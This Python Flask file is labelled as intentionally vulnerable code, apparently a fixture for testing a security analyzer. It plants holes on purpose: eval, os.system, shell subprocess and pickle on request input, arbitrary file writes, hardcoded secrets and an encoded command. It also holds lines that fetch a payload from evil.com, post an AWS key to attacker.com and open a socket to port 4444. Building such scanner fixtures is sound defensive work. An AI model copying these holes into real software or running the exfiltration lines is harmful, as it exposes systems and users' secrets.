"""
INTENTIONALLY VULNERABLE CODE - FOR TESTING SECURITY ANALYZER
DO NOT USE IN PRODUCTION
"""

import os
import sys
import pickle
import subprocess
from flask import Flask, request

app = Flask(__name__)

# HARDCODED SECRETS (Should be detected)
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE1234"
GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrst123456"
DATABASE_URL = "postgresql://admin:SuperSecret123@localhost:5432/prod"
API_KEY = "sk_live_51234567890abcdefghijklmnopqrstuvwxyz"
ENCRYPTED_DATA = "ZXZhbChfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnbHMgLWxhJykp"  # Base64 encoded

# High entropy secret
SECRET_TOKEN = "8f4d9c2b7e1a6f3d9c8b7a6e5d4c3b2a1f9e8d7c6b5a4e3d2c1b0"

@app.route('/execute')
def dangerous_execute():
    """CRITICAL VULNERABILITY: Code Execution"""
    # User input flows directly to eval
    code = request.args.get('code')  # Taint source
    result = eval(code)  # DANGEROUS SINK
    return str(result)

@app.route('/command')
def command_injection():
    """CRITICAL VULNERABILITY: Command Injection"""
    # User input in system command
    filename = request.args.get('file')  # Taint source
    os.system(f"cat {filename}")  # DANGEROUS SINK
    return "Command executed"

@app.route('/subprocess')
def subprocess_vuln():
    """HIGH VULNERABILITY: Subprocess with shell=True"""
    user_cmd = request.args.get('cmd')  # Taint source
    subprocess.call(user_cmd, shell=True)  # DANGEROUS
    return "Done"

@app.route('/pickle')
def pickle_vuln():
    """CRITICAL VULNERABILITY: Insecure Deserialization"""
    data = request.data  # Taint source
    obj = pickle.loads(data)  # DANGEROUS SINK
    return "Deserialized"

@app.route('/file_write')
def file_write():
    """MEDIUM VULNERABILITY: Arbitrary File Write"""
    filename = request.args.get('filename')  # Taint source
    content = request.args.get('content')
    with open(filename, 'w') as f:  # DANGEROUS
        f.write(content)
    return "File written"

def unsafe_operations():
    """Collection of unsafe operations"""
    # Command execution variants
    os.popen("ls -la")
    subprocess.Popen("whoami", shell=True)
    
    # Dynamic code execution
    exec("print('danger')")
    compile("malicious_code", "string", "exec")
    __import__("os").system("pwd")
    
    # Weak cryptography
    import hashlib
    password_hash = hashlib.md5(b"password").hexdigest()  # Weak
    
    # File operations with user input
    user_file = sys.argv[1] if len(sys.argv) > 1 else "/tmp/test"
    with open(user_file, 'r') as f:
        data = f.read()

def network_operations():
    """Network operations that could be suspicious"""
    import urllib.request
    import requests
    
    # Download from external source
    urllib.request.urlretrieve("http://evil.com/payload.sh", "/tmp/malware.sh")
    
    # Make HTTP requests
    requests.post("http://attacker.com/exfiltrate", data={"secrets": AWS_ACCESS_KEY})
    
    # Socket operations
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))

def taint_flow_example():
    """Demonstrate taint flow from source to sink"""
    # Source: Command line argument
    user_input = sys.argv[0] if len(sys.argv) > 0 else ""
    
    # Some processing
    processed = user_input.upper()
    
    # Sink: Dangerous function
    eval(processed)  # CRITICAL TAINT FLOW

if __name__ == "__main__":
    # Using environment variables unsafely
    secret_key = os.environ.get("SECRET_KEY", "default_secret_123")
    
    # More dangerous operations
    app.secret_key = secret_key
    app.run(host="0.0.0.0", debug=True)  # Debug mode in production


